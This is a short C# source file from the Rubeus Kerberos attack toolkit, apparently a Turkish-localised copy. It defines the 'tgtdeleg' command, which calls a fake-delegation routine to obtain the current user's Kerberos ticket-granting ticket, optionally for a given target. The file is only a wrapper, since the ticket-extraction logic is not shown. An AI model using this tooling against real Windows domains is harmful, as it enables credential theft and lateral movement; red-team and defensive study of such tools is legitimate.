using System;
using System.Collections.Generic;


namespace Rubeus.Commands
{
    public class Tgtdeleg : ICommand
    {
        public static string CommandName => "tgtdeleg";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("\r\n[*] Eylem: Sahte Devir (Fake Delegation) TGT Talep Et (mevcut kullanici)\r\n");

            if (arguments.ContainsKey("/target"))
            {
                byte[] blah = LSA.RequestFakeDelegTicket(arguments["/target"]);
            }
            else
            {
                byte[] blah = LSA.RequestFakeDelegTicket();
            }
        }
    }
}